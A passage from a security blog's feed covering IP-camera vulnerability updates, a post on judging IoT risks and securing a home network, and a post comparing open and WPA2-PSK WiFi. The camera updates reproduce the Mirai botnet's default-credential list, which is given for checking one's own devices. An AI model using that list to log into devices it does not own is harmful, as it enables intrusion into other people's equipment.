&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;Update: as you can see in the following screenshot, the bad guys already started to take advantage of this issue ... https://www.incapsula.com/blog/cctv-ddos-botnet-back-yard.html&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/blogger-image--2098725782.jpg&quot; src=&quot;https://z6543.github.io/_img/blogger-image--2098725782.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/blogger-image--2098725782.jpg&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div&gt;Update 20161006: The Mirai source code was leaked last week, and these are the worst passwords you can have in an IoT device. If your IoT device has a Telnet port open (or SSH), scan for these username/password pairs.&lt;br /&gt;&lt;br /&gt;root     xc3511&lt;br /&gt;root     vizxv&lt;br /&gt;root     admin&lt;br /&gt;admin    admin&lt;br /&gt;root     888888&lt;br /&gt;root     xmhdipc&lt;br /&gt;root     default&lt;br /&gt;root     juantech&lt;br /&gt;root     123456&lt;br /&gt;root     54321&lt;br /&gt;support  support&lt;br /&gt;root     (none)&lt;br /&gt;admin    password&lt;br /&gt;root     root&lt;br /&gt;root     12345&lt;br /&gt;user     user&lt;br /&gt;admin    (none)&lt;br /&gt;root     pass&lt;br /&gt;admin    admin1234&lt;br /&gt;root     1111&lt;br /&gt;admin    smcadmin&lt;br /&gt;admin    1111&lt;br /&gt;root     666666&lt;br /&gt;root     password&lt;br /&gt;root     1234&lt;br /&gt;root     klv123&lt;br /&gt;Administrator admin&lt;br /&gt;service  service&lt;br /&gt;supervisor supervisor&lt;br /&gt;guest    guest&lt;br /&gt;guest    12345&lt;br /&gt;guest    12345&lt;br /&gt;admin1   password&lt;br /&gt;administrator 1234&lt;br /&gt;666666   666666&lt;br /&gt;888888   888888&lt;br /&gt;ubnt     ubnt&lt;br /&gt;root     klv1234&lt;br /&gt;root     Zte521&lt;br /&gt;root     hi3518&lt;br /&gt;root     jvbzd&lt;br /&gt;root     anko&lt;br /&gt;root     zlxx.&lt;br /&gt;root     7ujMko0vizxv&lt;br /&gt;root     7ujMko0admin&lt;br /&gt;root     system&lt;br /&gt;root     ikwb&lt;br /&gt;root     dreambox&lt;br /&gt;root     user&lt;br /&gt;root     realtek&lt;br /&gt;root     00000000&lt;br /&gt;admin    1111111&lt;br /&gt;admin    1234&lt;br /&gt;admin    12345&lt;br /&gt;admin    54321&lt;br /&gt;admin    123456&lt;br /&gt;admin    7ujMko0admin&lt;br /&gt;admin    1234&lt;br /&gt;admin    pass&lt;br /&gt;admin    meinsm&lt;br /&gt;tech     tech&lt;br /&gt;mother   fucker&lt;/div&gt;&lt;div&gt;&lt;br /&gt;Update 2016 10 27: As I already mentioned this at multiple conferences, the cloud protocol is a nightmare. It is clear-text, and even if you disabled port-forward/UPNP on your router, the cloud protocol still allows anyone to connect to the camera if the attacker knows the (brute-forceable) camera ID. Although this is the user-interface only, now the attacker can use the command injection to execute code with root privileges. Or just grab the camera configuration, with WiFi, FTP, SMTP passwords included.&lt;br /&gt;Youtube video : https://www.youtube.com/watch?v=18_zTjsngD8&lt;br /&gt;Slides (29 - ) https://www.slideshare.net/bz98/iot-security-is-a-nightmare-but-what-is-the-real-risk&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/ipcamera_protocol2.png&quot; src=&quot;https://z6543.github.io/_img/ipcamera_protocol2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/ipcamera_protocol2.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Update 2017-03-08: &quot;&lt;span style=&quot;text-align: start; white-space: pre-wrap;&quot;&gt;Because of code reusing, the vulnerabilities are present in a massive list of cameras (especially the InfoLeak and the RCE),&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;text-align: start; white-space: pre-wrap;&quot;&gt;which allow us to execute root commands against 1250+ camera models with a pre-auth vulnerability. &lt;/span&gt;&quot;&lt;a href=&quot;https://pierrekim.github.io/advisories/2017-goahead-camera-0x00.txt&quot;&gt;https://pierrekim.github.io/advisories/2017-goahead-camera-0x00.txt&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;Update 2017-05-11: CVE-2017-5674 (see above), and my command injection exploit was combined in the Persirai botnet. 120 000 cameras are expected to be infected soon. If you still have a camera like this at home, please consider the following recommendation by Amit Serper &quot;The only way to guarantee that an affected camera is safe from these exploits is to throw it out. Seriously.&quot;&lt;br /&gt;This issue might be worse than the Mirai worm because these effects cameras and other IoT behind NAT where UPnP was enabled.&lt;br /&gt;&lt;a href=&quot;http://blog.trendmicro.com/trendlabs-security-intelligence/persirai-new-internet-things-iot-botnet-targets-ip-cameras/&quot;&gt;http://blog.trendmicro.com/trendlabs-security-intelligence/persirai-new-internet-things-iot-botnet-targets-ip-cameras/&lt;/a&gt;&lt;br /&gt;&lt;span style=&quot;background-color: white; font-size: 14px; text-align: left;&quot;&gt;&lt;span style=&quot;color: #666666; font-family: &amp;quot;arial&amp;quot; , sans-serif;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;background-color: white; color: #666666; font-family: &amp;quot;arial&amp;quot; , sans-serif; font-size: 14px; text-align: left;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>How to secure your home against "Internet of Things" and FUD</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/hack/home/security/internet/of/things/iot/2015/08/20/How-to-secure-your-home-against-Internet-of-Things-and-FUD.html"/>
   <updated>2015-08-20T14:06:38+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/hack/home/security/internet/of/things/iot/2015/08/20/How-to-secure-your-home-against-"Internet-of-Things"-and-FUD</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;TL;DR, most of the security news about IoT is full of FUD. Always put the risks in context - who can exploit this and what can the attacker do with it. Most story only covers the latter.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;Introduction&lt;/h2&gt;
&lt;div style=&quot;&quot;&gt;There is rarely a day without news that another &quot;Internet of Things&quot; got hacked. &quot;Smart&quot; safes, &quot;smart&quot; rifles, &quot;smart&quot; cars, &quot;smart&quot; fridges, &quot;smart&quot; TVs, &quot;smart&quot; alarm systems, &quot;smart&quot; meters, &quot;smart&quot; bulbs, NAS devices, routers. These devices are getting hacked every day. Because most of these devices were never designed with security as a goal, and some of them have been never tested by security professionals, it is no surprise that these things are full of vulnerabilities.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/thereisnotiot.png&quot; src=&quot;https://z6543.github.io/_img/thereisnotiot.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/thereisnotiot.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Independent security researchers find these vulnerabilities, write a cool blog post or give a presentation about the vulnerability and the exploit, and the media forgets the constraints just for the sake of more clicks. &quot;We are all doomed&quot; we can read in the news, but sometimes the risks are buried deeply in technical jargon. Please note I blame the news sites here, not the researchers.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/iotjunk.png&quot; src=&quot;https://z6543.github.io/_img/iotjunk.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/iotjunk.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;http://www.slideshare.net/danielmiessler/iot-attack-surfaces-defcon-2015&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;There are huge differences between the following risks:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Attackers can directly communicate with the router (or camera) from the Internet without authentication and exploit the vulnerability. This is the worst-case scenario. For example, an &lt;a href=&quot;http://forum.synology.com/enu/viewtopic.php?f=3&amp;amp;t=88716&quot; target=&quot;_blank&quot;&gt;automated ransomware attack&lt;/a&gt; against your NAS is pretty bad.&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Attackers have to position themselves in the same WAN network (e.g. Sprint mobile network in the case of Jeep hacking) to exploit the vulnerability. This is still pretty bad.&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;The vulnerable code can not be triggered directly from the Internet, but tricks like CSRF can be used to exploit it (details later in this post). &lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;The vulnerable code can not be triggered directly from the Internet, and it uses a protocol/port which prevents &lt;a href=&quot;https://www.kb.cert.org/vuls/id/476267&quot; target=&quot;_blank&quot;&gt;Cross Protocol Scripting&lt;/a&gt;. Attackers have to access the local network before exploiting this vulnerability.&lt;/li&gt;&lt;/ul&gt;
&lt;div style=&quot;&quot;&gt;As it is the case with the worst scenario, one can find a lot of devices connected to the internet. You can always find funny stuff at &lt;a href=&quot;http://explorer.shodanhq.com/#/explore&quot;&gt;http://explorer.shodanhq.com/#/explore&lt;/a&gt; , or use the &lt;a href=&quot;https://www.trustwave.com/Resources/SpiderLabs-Blog/Using-Nmap-to-Screenshot-Web-Services/&quot; target=&quot;_blank&quot;&gt;nmap screenshot script&lt;/a&gt; to find your own stuff :)&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/shodan.png&quot; src=&quot;https://z6543.github.io/_img/shodan.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/shodan.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;Network exposure&lt;/h2&gt;
&lt;div style=&quot;&quot;&gt;Most devices are behind an IPv4 NAT device (e.g. home router), thus can not be reached from the Internet side by default. Except when the device configures the firewall via UPNP. Or the device has a persistence cloud connection, and the cloud can send commands to the device. Or the device uses IPv6 tunneling (e.g. Teredo), thus it is reachable from the Internet. But not every vulnerability on your home network is accessible directly from the Internet. As more and more devices and networks will support IPv6, this scenario might change, but I hope most home routers will come with a default deny configuration in their IPv6 firewall module. On the other hand, scanning for IPv6 devices blindly is not feasible due to the large number of IPv6 addresses, but &lt;a href=&quot;https://youtu.be/t9d7p3zxoiM?t=2437&quot; target=&quot;_blank&quot;&gt;some tricks might work&lt;/a&gt;. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If attackers can not access the device directly, there is a way to hack it through the user's browser. Just convince the victim user to visit a website, and via &lt;a href=&quot;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&quot; target=&quot;_blank&quot;&gt;CSRF (Cross Site Request Forgery)&lt;/a&gt; and brute-forcing the device IP, it is possible to hack some devices (mostly through HTTP - if the exploit can fit into simple GET or POST commands.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/csrf.png&quot; src=&quot;https://z6543.github.io/_img/csrf.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/csrf.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If attackers can not attack the device vulnerability through the Internet directly, or via CSRF, but have connected to the same network - the network exposure shrinks significantly. And when attackers are on the same network as you, I bet you have bigger problems than the security of the IoT devices ...&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;Recommendations for home users&lt;/h2&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Don't buy **** you don't need&lt;br /&gt;&lt;br /&gt;Disconnect from the power cord the IoT devices you don't need to operate 7*24. &lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Disable cloud connectivity if it is not necessary. For example, I have a NAS device that can be reached through the &quot;cloud&quot;, but I have disabled it by not configuring any default gateway for the device. I prefer connecting to my network via VPN and reach all my stuff through that.&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Prevent CSRF attacks. I use two tricks. Don't use the 192.168.0.x - 192.168.10.x network at-home - use an uncommon IP range instead (e.g. 192.168.156.x is better). The second trick is I configured my Adblock plugin in my primary browser to block access to my internal network. And I use another browser whenever I want to access my internal devices. Update: On Firefox you can use NoScript ABE to block access to internal resources.&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/adblock.png&quot; src=&quot;https://z6543.github.io/_img/adblock.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/adblock.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Check your router configuration:&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;disable UPnP&lt;/li&gt;&lt;li&gt;check the firewall settings and disable unnecessary port forwards&lt;/li&gt;&lt;li&gt;check for IPv6 settings, and configure the firewall as default deny for incoming IPv6 TCP/UDP.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Change default passwords, especially for services connected to the Internet. &lt;a href=&quot;http://jumpespjump.blogspot.com/2014/10/change-passwords-regularly-myth-and-lie.html&quot; target=&quot;_blank&quot;&gt;Follow password best practices.&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Run Nmap to locate new IoT in your home network :) &lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Run a WiFi scan to locate new WiFi access points. Let me share a personal experience with you. I moved to a new house and brought my own WiFi router with me. I plugged it in, and forget about WiFi. Months later it turned out I had two other WiFi devices in my house - the cable modem had its own integrated WiFi with default passwords printed on the bottom, and the Set-top-box was the same - default WiFi passwords printed on the bottom. And don't forget to scan for ZigBee, Bluetooth, IrDA, FM, ...&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Update your devices - in case you have a lot of free time in your hand.&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Don't allow your guests to connect to your home network. Set up a separated AP for them. Imagine your nephew stealing your private photos or videos from your NAS or DNLA server.&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;With great power, comes great responsibility. The less device you own in your house, the less time you need to maintain those.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Read the manuals of your devices. Be aware of the different interfaces. Configure it in a secure way.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;Disable Teredo protocol in case you don't need IPv6.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Stop being amazed by junk hacking.&lt;br /&gt;&lt;br /&gt;Update: Disable WebRTC: &lt;a href=&quot;https://www.browserleaks.com/webrtc&quot; target=&quot;_blank&quot;&gt;https://www.browserleaks.com/webrtc&lt;/a&gt; , in Chrome you can use this extension: &lt;a href=&quot;https://chrome.google.com/webstore/detail/webrtc-network-limiter/npeicpdbkakmehahjeeohfdhnlpdklia&quot;&gt;https://chrome.google.com/webstore/detail/webrtc-network-limiter/npeicpdbkakmehahjeeohfdhnlpdklia&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;Update: Prevent against DNS rebind attacks via configuring a DNS server which can block internal IP addresses. OpenDNS can block internal IP, but this is not a default option, you have to configure it.&lt;br /&gt;&lt;h2&gt;Recommendations for vendors&lt;/h2&gt;&lt;div&gt;For vendors, I recommend at least the followings:&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Implement security during Software Development LifeCycle&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Continuous security testing and bug bounties&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Seamless auto-update&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Opt-in cloud connectivity&lt;/li&gt;&lt;/ul&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;Recommendations for journalists&lt;/h2&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Stop FUD. Pretty please.&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;The questions to ask before losing your head&lt;/h2&gt;
&lt;div&gt;&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;who can exploit the vulnerability?&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;what prerequisites do we have about the attack to successfully exploit the vulnerability? Is the attacker already in your home network? If yes, you have probably bigger problems.&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;what can the attacker do when the exploit is successful?&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;And last but not least, don't forget that in the case of IoT devices, sometimes users are the product, not the customer. IoT is about collecting data for marketing purposes.&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://blog.open-xchange.com/2015/02/09/iot/&quot;&gt;http://blog.open-xchange.com/2015/02/09/iot/&lt;/a&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/ios.png&quot; src=&quot;https://z6543.github.io/_img/ios.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/ios.png&quot; width=&quot;248&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Mythbusters - Is an open (unencrypted) WiFi more dangerous than a WPA2-PSK? Actually, it is not</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/vpn/wifi/wireless/wpa2/wpa2-psk/2015/07/23/Mythbusters-Is-an-open-(unencrypted)-WiFi-more-dangerous-than-a-WPA2-PSK-Actually,-it-is-not.html"/>
   <updated>2015-07-23T13:37:15+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/vpn/wifi/wireless/wpa2/wpa2-psk/2015/07/23/Mythbusters:-Is-an-open-(unencrypted)-WiFi-more-dangerous-than-a-WPA2-PSK?-Actually,-it-is-not</id>
   <content type="html">&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Whenever security professionals recommend the 5 most important IT security practices to average users, one of the items is usually something like: “Avoid using open Wifi” or “Always use VPN while using open WiFi” or “Avoid sensitive websites (e.g. online banking) while using open WiFI”, etc.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;What I think about this? It is bullshit. But let’s not jump to the conclusions. Let’s analyze all risks and factors here.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/chive-thursday-29.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/chive-thursday-29.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/chive-thursday-29.jpg&quot; width=&quot;270&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;During the following analysis, I made two assumptions. The first one is that we are comparing public WiFi hotspots with no encryption at all (referred to as Open), and we compare this to public WiFi hotspots with WPA2-PSK (and just hope WEP died years before). The other assumption is there are people who are security-aware, and those who just don’t care. They just want to browse the web, access Facebook, write e-mails, etc.&lt;/div&gt;
&lt;h3&gt;The risks&lt;/h3&gt;
&lt;div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Let’s discuss the different threats people face using public hotspots, compared to home/work internet usage:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;1.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;Where the website session data is not protected with SSL/TLS (and the cookie is not protected with secure flag), attackers on the same hotspot can obtain the session data and use it in session/login credentials stealing. Typical protocols affected:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;HTTP sites&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;HTTPS sites but unsecured cookie&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;FTP without encryption&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;IMAP/SMTP/POP3 without SSL/TLS or STARTTLS&lt;/li&gt;&lt;/ul&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;2.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;Attackers can inject extra data into the HTTP traffic, which can be used for exploits, or social engineer attacks (e.g. update Flash player with our malware) – see the &lt;a href=&quot;https://securelist.com/files/2014/11/darkhotel_kl_07.11.pdf&quot; target=&quot;_blank&quot;&gt;Dark Hotel campaign&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;3.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;Attackers can use tools like SSLStrip to keep the user’s traffic on clear text HTTP and steal password/session data/personal information&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;4.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;Attackers can monitor and track user activity&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;5.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;Attackers can directly attack the user’s machine (e.g. SMB service)&lt;/div&gt;
&lt;h3&gt;WPA2-PSK security&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;So, why is a public WPA2-PSK WiFi safer than an open WiFi? Spoiler alert: it is not!&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;In a generic public WPA2-PSK scenario, all users share the same password. And guess what, the whole traffic can be decrypted with the following information: SSID + shared password + information from the 4-way handshake. &lt;a href=&quot;https://wiki.wireshark.org/HowToDecrypt802.11&quot;&gt;https://wiki.wireshark.org/HowToDecrypt802.11&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If you want to see it in action, here is a nice tutorial for you&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://www.lovemytool.com/blog/2010/05/wireshark-and-tshark-decrypt-sample-capture-file-by-joke-snelders.html&quot;&gt;http://www.lovemytool.com/blog/2010/05/wireshark-and-tshark-decrypt-sample-capture-file-by-joke-snelders.html&lt;/a&gt;&lt;/div&gt;
&lt;table align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/6a00e008d95770883401348056c1d8970c.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/6a00e008d95770883401348056c1d8970c.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/6a00e008d95770883401348056c1d8970c.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Decrypted WPA2-PSK traffic&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div style=&quot;&quot;&gt;Any user having access to the same WPA2-PSK network knows this information. So they can instantly decrypt your traffic. Or the attackers can just set up an access point with the same SSID, same password, and stronger signal. And now, the attacker can instantly launch active man-in-the-middle attacks. It is a common belief (even among ITSEC experts) that WPA2-PSK is not vulnerable to this attack. I am not sure why this vulnerability was left in the protocol, if you have the answer, let me know. Edit (2015-08-03): I think the key message here is that without server authentication (e.g. via PKI), it is not possible to solve this.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Let me link here one of my previous posts here with a great skiddie tool:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://jumpespjump.blogspot.nl/2014/04/dsploit.html&quot;&gt;http://jumpespjump.blogspot.nl/2014/04/dsploit.html&lt;/a&gt;&lt;/div&gt;
